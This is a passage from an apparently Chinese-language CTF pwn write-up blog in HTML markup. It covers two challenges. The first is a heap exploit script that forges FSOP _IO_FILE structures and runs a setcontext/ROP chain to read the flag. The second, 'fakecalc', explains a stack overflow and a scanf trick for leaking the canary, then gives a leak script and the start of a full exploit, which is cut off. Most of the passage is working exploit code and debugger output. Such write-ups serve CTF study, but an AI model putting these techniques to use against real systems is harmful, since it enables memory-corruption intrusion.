class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(i+<span class="number">1</span>,<span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    edit(i+<span class="number">1</span>,p64(<span class="number">0x21</span>)*<span class="number">13</span>+p64(<span class="number">0x6020A0</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">0x68</span>+p16(<span class="number">0x4e1</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">18</span>,<span class="number">0x70</span>)</span><br><span class="line">show(<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3ec0c0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">0x68</span>+p16(<span class="number">0x441</span>))</span><br><span class="line">gift(libc_base,<span class="number">0x600</span>)</span><br><span class="line">delete(<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">io_list_all = libc_base + <span class="number">0x3ec660</span></span><br><span class="line">success(<span class="string">&quot;io_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(io_list_all))</span><br><span class="line"></span><br><span class="line">target_addr = io_list_all</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(target_addr-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">gift(libc_base,<span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x2c0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">libc_system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">53</span></span><br><span class="line">success(<span class="string">&quot;setcontext &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(setcontext))</span><br><span class="line"></span><br><span class="line">magic_addr = libc_base + <span class="number">0x00000000000d28de</span> <span class="comment"># add rsp 0xe0</span></span><br><span class="line">magic2_addr = libc_base + <span class="number">0x00000000000e0b2d</span> <span class="comment"># add rsp 0x38</span></span><br><span class="line">magic3_addr = libc_base + <span class="number">0x000000000003e212</span> <span class="comment"># add rsp 0x28</span></span><br><span class="line">ret = libc_base + <span class="number">0x00000000000008aa</span> </span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x000000000001b500</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002164f</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x0000000000023a6a</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x0000000000001b96</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x000000000013ff57</span></span><br><span class="line"></span><br><span class="line">fake_io_addr = heap_base + <span class="number">0x340</span> </span><br><span class="line">payload_addr = heap_base + <span class="number">0x340</span> </span><br><span class="line">flag_addr = heap_base + <span class="number">0x340</span> </span><br><span class="line">success(<span class="string">&quot;fake_io_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(fake_io_addr))</span><br><span class="line"></span><br><span class="line">fake_IO_FILE1 =  <span class="string">b&quot;/bin/sh\x00&quot;</span>         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE1 =  fake_IO_FILE1.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE1 += p64(magic_addr)</span><br><span class="line">fake_IO_FILE1 += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE1 += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE1 += p64(payload_addr-<span class="number">0xa0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE1 += p64(setcontext)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE1 =  fake_IO_FILE1.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE1 += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE2 = <span class="string">&quot;&quot;</span></span><br><span class="line">fake_IO_FILE2 =  fake_IO_FILE2.ljust(<span class="number">0xa0</span>-<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE2 += p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE2 += p64(ret)</span><br><span class="line">fake_IO_FILE2 =  fake_IO_FILE2.ljust(<span class="number">0xb0</span>-<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE2 += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE2 =  fake_IO_FILE2.ljust(<span class="number">0xc0</span>-<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE2 += p64(<span class="number">1</span>)</span><br><span class="line">fake_IO_FILE2 += p64(_IO_wfile_jumps+<span class="number">0x30</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE2 += p64(_IO_wfile_jumps+<span class="number">0x30</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE2 += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE3 = <span class="string">&quot;a&quot;</span>*<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;fake_io_addr+0x40 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(fake_io_addr+<span class="number">0x40</span>))</span><br><span class="line">success(<span class="string">&quot;fake_IO_FILE1 len &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(fake_IO_FILE1)))</span><br><span class="line">success(<span class="string">&quot;fake_IO_FILE2 len &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(fake_IO_FILE2)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">payload = fake_IO_FILE1</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = fake_IO_FILE2</span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(ret)*<span class="number">9</span>+p64(magic2_addr)+p64(fake_io_addr+<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&quot;./flag&quot;</span>.ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"><span class="comment"># open(bss_addr,0)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(heap_base+<span class="number">0x4d0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">payload += p64(magic3_addr)</span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(3,bss_addr,0x60)</span></span><br><span class="line">payload  = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(heap_base+<span class="number">0x4d0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">payload += p64(magic2_addr)</span><br><span class="line">edit(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line">payload  = p64(ret) </span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(heap_base+<span class="number">0x4d0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">&quot;Index&quot;</span>,<span class="built_in">str</span>(<span class="number">11</span>))     </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="fakecalc"><a href="#fakecalc" class="headerlink" title="fakecalc"></a>fakecalc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a.out: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">073f</span>580c2010498ed638e9d9d4051016cb790fdb, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>栈溢出漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; size; ++i )</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%hhd&quot;</span>, &amp;v5[i]);</span><br></pre></td></tr></table></figure>
<p>有后门：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">door</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>利用溢出可以泄露 canary，不过这里有一点需要注意：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; size; ++i )</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%hhd&quot;</span>, &amp;v5[i]);</span><br></pre></td></tr></table></figure>
<p>在 scanf 写入失败时虽然可以不覆盖数据，但遗留在缓冲区中的数据并不会被销毁，这会导致之后所有的 scanf 失败（scanf 使用 stdin 缓冲区）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_2_1_stdin_</span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72540021</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x7f731ca69a03</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x7f731ca69a04</span> &lt;_IO_2_1_stdin_+<span class="number">132</span>&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x7f731ca69a03</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x7f731ca69a03</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x7f731ca69a03</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x7f731ca69a03</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x7f731ca69a03</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x7f731ca69a04</span> &lt;_IO_2_1_stdin_+<span class="number">132</span>&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x0</span>,</span><br><span class="line">    _fileno = <span class="number">0</span>,</span><br><span class="line">    _flags2 = <span class="number">0</span>,</span><br><span class="line">    _old_offset = <span class="number">-1</span>,</span><br><span class="line">    _cur_column = <span class="number">0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x7f731ca6b7f0</span> &lt;_IO_stdfile_0_lock&gt;,</span><br><span class="line">    _offset = <span class="number">-1</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x7f731ca69a60</span> &lt;_IO_wide_data_0&gt;,</span><br><span class="line">    _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">    __pad5 = <span class="number">0</span>,</span><br><span class="line">    _mode = <span class="number">-1</span>,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x7f731ca664a0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>stdin 缓冲区默认为 <code>_IO_2_1_stdin_+131</code>，如果不够用则会使用栈上 0x400 大小的空间，如果再不够则会调用 malloc 申请堆空间</li>
</ul>
<p>分析 scanf 的源码可以找到解决办法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">case</span> <span class="title">L_</span><span class="params">(<span class="string">&#x27;d&#x27;</span>)</span>:	<span class="comment">/* Signed decimal integer.  */</span></span></span><br><span class="line"><span class="function">  base </span>= <span class="number">10</span>;</span><br><span class="line">  flags |= NUMBER_SIGNED;</span><br><span class="line">  <span class="keyword">goto</span> number;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">number:</span><br><span class="line">  c = inchar ();</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (c == EOF))</span><br><span class="line">    input_error ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check for a sign.  */</span></span><br><span class="line">  <span class="keyword">if</span> (c == L_(<span class="string">&#x27;-&#x27;</span>) || c == L_(<span class="string">&#x27;+&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      char_buffer_add (&amp;charbuf, c);</span><br><span class="line">      <span class="keyword">if</span> (width &gt; <span class="number">0</span>)</span><br><span class="line">	--width;</span><br><span class="line">      c = inchar ();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当遇到 <code>+ -</code> 时，scanf 会选择跳过然后匹配下一个字符，利用这一点即可使 scanf 不覆盖数据</li>
</ul>
<p>这样我们就可以一次泄露1字节，将 canary 泄露出来，而在泄露 pro_base 时需要注意 canary 对后续计算的影响</p>
<p>下面是泄露使用的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_target</span>(<span class="params">offset,canary=<span class="number">0</span></span>):</span></span><br><span class="line">    leak = <span class="number">0</span></span><br><span class="line">    leakt = <span class="number">0</span></span><br><span class="line">    canary_offset = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(canary!=<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            canary_offset += canary&gt;&gt;(<span class="number">8</span>*i) &amp; <span class="number">0xff</span></span><br><span class="line">        canary_offset = canary_offset &amp; <span class="number">0xff</span></span><br><span class="line">    success(<span class="string">&quot;canary_offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary_offset))</span><br><span class="line"></span><br><span class="line">    leak_addr1 = add(offset,<span class="number">1</span>,canary)</span><br><span class="line">    leakt = leak_addr1</span><br><span class="line">    leakt = sub_num(leakt,canary_offset)</span><br><span class="line">    leak += leakt*<span class="number">0x1</span></span><br><span class="line">    success(<span class="string">&quot;leak_part &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakt))</span><br><span class="line">   </span><br><span class="line">    leak_addr2 = add(offset,<span class="number">2</span>,canary)</span><br><span class="line">    leakt = sub_num(leak_addr2,leak_addr1)</span><br><span class="line">    leak += leakt*<span class="number">0x100</span></span><br><span class="line">    success(<span class="string">&quot;leak_part &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakt))</span><br><span class="line"></span><br><span class="line">    leak_addr1 = add(offset,<span class="number">3</span>,canary)</span><br><span class="line">    leakt = sub_num(leak_addr1,leak_addr2)</span><br><span class="line">    leak += leakt*<span class="number">0x10000</span></span><br><span class="line">    success(<span class="string">&quot;leak_part &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakt))</span><br><span class="line"></span><br><span class="line">    leak_addr2 = add(offset,<span class="number">4</span>,canary)</span><br><span class="line">    leakt = sub_num(leak_addr2,leak_addr1)</span><br><span class="line">    leak += leakt*<span class="number">0x1000000</span></span><br><span class="line">    success(<span class="string">&quot;leak_part &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakt))</span><br><span class="line"></span><br><span class="line">    leak_addr1 = add(offset,<span class="number">5</span>,canary)</span><br><span class="line">    leakt = sub_num(leak_addr1,leak_addr2)</span><br><span class="line">    leak += leakt*<span class="number">0x100000000</span></span><br><span class="line">    success(<span class="string">&quot;leak_part &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakt))</span><br><span class="line"></span><br><span class="line">    leak_addr2 = add(offset,<span class="number">6</span>,canary)</span><br><span class="line">    leakt = sub_num(leak_addr2,leak_addr1)</span><br><span class="line">    leak += leakt*<span class="number">0x10000000000</span></span><br><span class="line">    success(<span class="string">&quot;leak_part &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakt))</span><br><span class="line"></span><br><span class="line">    leak_addr1 = add(offset,<span class="number">7</span>,canary)</span><br><span class="line">    leakt = sub_num(leak_addr1,leak_addr2)</span><br><span class="line">    leak += leakt*<span class="number">0x1000000000000</span></span><br><span class="line">    success(<span class="string">&quot;leak_part &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakt))</span><br><span class="line"></span><br><span class="line">    leak_addr2 = add(offset,<span class="number">8</span>,canary)</span><br><span class="line">    leakt = sub_num(leak_addr2,leak_addr1)</span><br><span class="line">    leak += leakt*<span class="number">0x100000000000000</span></span><br><span class="line">    success(<span class="string">&quot;leak_part &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakt))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> leak</span><br><span class="line"></span><br><span class="line">leak_addr = leak_target(<span class="number">0x108</span>)</span><br><span class="line">canary = leak_addr</span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;canary &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">leak_addr = leak_target(<span class="number">0x118</span>,canary)</span><br><span class="line">pro_base = leak_addr - <span class="number">0x19a3</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br></pre></td></tr></table></figure>
<p>最后覆盖返回地址为后门地址即可</p>
<p>本题目需要提权去执行一个没有 x 权限的程序，可以使用 ld 来进行操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ls -al ./getflag                  </span><br><span class="line">-rw-r--r-- <span class="number">1</span> yhellow yhellow <span class="number">16688</span> <span class="number">11</span>月  <span class="number">8</span> <span class="number">23</span>:<span class="number">57</span> ./getflag</span><br><span class="line">➜  <span class="built_in">exp</span> ./getflag    </span><br><span class="line">zsh: 权限不够: ./getflag</span><br><span class="line">➜  <span class="built_in">exp</span> /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> ./getflag</span><br><span class="line">flag&#123;yhellow&#125;</span><br></pre></td></tr></table></figure>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span 